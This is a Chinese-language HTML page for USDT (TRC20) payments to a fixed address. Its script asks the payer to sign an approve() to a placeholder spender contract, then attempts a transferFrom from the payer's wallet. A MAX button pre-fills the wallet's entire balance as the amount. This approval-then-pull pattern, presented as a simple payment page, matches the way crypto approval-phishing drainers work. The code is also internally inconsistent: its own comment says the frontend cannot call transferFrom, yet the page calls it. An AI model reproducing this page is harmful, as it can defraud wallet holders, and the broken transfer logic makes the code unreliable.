<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TRC20 USDT 支付页面</title>
    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.1/dist/TronWeb.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: system-ui, -apple-system, sans-serif;
        }
        body {
            padding: 24px 16px;
            max-width: 560px;
            margin: 0 auto;
            background-color: #ffffff;
        }
        .item-box {
            background: #f7f8fa;
            border-radius: 16px;
            padding: 24px 20px;
            margin-bottom: 16px;
        }
        .label {
            font-size: 18px;
            color: #666666;
            margin-bottom: 14px;
        }
        .addr-input{
            width: 100%;
            border:none;
            background:#ffffff;
            padding:14px 12px;
            border-radius:10px;
            font-size:16px;
            color:#222;
        }
        .amount-wrap{
            display:flex;
            align-items:center;
            justify-content:space-between;
        }
        .amount{
            font-size:56px;
            border:none;
            width:72%;
            background:transparent;
            outline:none;
            color:#111;
        }
        .max-btn{
            padding:8px 16px;
            background:#e1edff;
            color:#206cff;
            border-radius:8px;
            border:none;
            font-size:16px;
            cursor: pointer;
        }
        .token-row{
            margin-top:20px;
            display:flex;
            align-items:center;
            background:#edf2ff;
            padding:14px;
            border-radius:12px;
        }
        .token-icon{
            width:32px;
            height:32px;
            margin-right:10px;
        }
        .submit-btn{
            width:100%;
            padding:18px;
            margin-top:36px;
            border:none;
            border-radius:14px;
            font-size:20px;
            background:#dcdde0;
            color:#999;
            cursor: not-allowed;
        }
        .submit-btn.active{
            background:#206cff;
            color:#ffffff;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="item-box">
        <div class="label">收款地址</div>
        <input class="addr-input" id="toAddress" value="TXiQrtf21RgYjvymcUGUQd1RaABb1rcHYL" readonly>
    </div>

    <div class="item-box">
        <div class="label">转账金额</div>
        <div class="amount-wrap">
            <input class="amount" id="amount" value="0.00" type="text">
            <button class="max-btn" id="maxBtn">MAX</button>
        </div>
        <div class="token-row">
            <img class="token-icon" src="https://static.tronscan.org/production/logo/usdttrc20.png" alt="USDT">
            <span style="font-size:20px;font-weight:bold">USDT</span>
            <span style="margin-left:auto;color:#666;">TRC20</span>
        </div>
    </div>

    <button class="submit-btn" id="payBtn">下一步</button>

<script>
// =========== 配置区域 ===========
const USDT_TRC20_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const RECEIVE_ADDRESS = "TXiQrtf21RgYjvymcUGUQd1RaABb1rcHYL";
// 注意：approve授权给谁，这里填写【执行transferFrom的合约地址】
// 如果你没有中间中转合约，单纯前端无法调用transferFrom！重要知识点！
const SPENDER_ADDRESS = "在这里填入你的中转合约地址";
let tronWeb = null;

const amountInput = document.getElementById("amount");
const submitBtn = document.getElementById("payBtn");

// 输入金额校验，激活按钮
amountInput.addEventListener('input', function(){
    const val = parseFloat(this.value);
    if(!isNaN(val) && val > 0){
        submitBtn.classList.add('active');
    }else{
        submitBtn.classList.remove('active');
    }
});

// MAX按钮：读取余额填充
document.getElementById("maxBtn").onclick = async function(){
    if(!window.tronWeb || !window.tronWeb.ready){
        alert("请在TP钱包、欧易Web3钱包内置浏览器打开页面");
        return;
    }
    tronWeb = window.tronWeb;
    const userAddr = tronWeb.defaultAddress.base58;
    const usdtContract = await tronWeb.contract().at(USDT_TRC20_CONTRACT);
    const balanceSun = await usdtContract.balanceOf(userAddr).call();
    const balanceNum = tronWeb.fromSun(balanceSun.toString());
    amountInput.value = balanceNum;
    submitBtn.classList.add('active');
};

// 核心流程：先授权approve → 授权成功后transferFrom
document.getElementById("payBtn").onclick = async function(){
    if(!this.classList.contains('active')) return;
    try{
        if(window.tronWeb && window.tronWeb.ready){
            tronWeb = window.tronWeb;
        }else{
            alert("未检测到波场钱包，请使用TP/欧易Web3钱包内置浏览器访问");
            return;
        }

        const transferAmountText = amountInput.value;
        const amountSun = tronWeb.toSun(transferAmountText);
        const usdtContract = await tronWeb.contract().at(USDT_TRC20_CONTRACT);

        // 第一步：授权 approve
        alert("即将发起授权签名");
        const approveTx = await usdtContract.approve(SPENDER_ADDRESS, amountSun).send({
            feeLimit:100000000
        });
        alert(`✅授权成功！授权交易哈希：${approveTx}\n准备执行划转`);

        // 第二步：transferFrom 从用户地址划转资金到收款地址
        const userAddress = tronWeb.defaultAddress.base58;
        const transferTx = await usdtContract.transferFrom(
            userAddress,
            RECEIVE_ADDRESS,
            amountSun
        ).send({
            feeLimit:100000000
        });
        alert(`✅资金划转完成！交易哈希：${transferTx}`);

    }catch(err){
        alert(`操作失败：${err.message}`);
    }
}
</script>
</body>
</html>
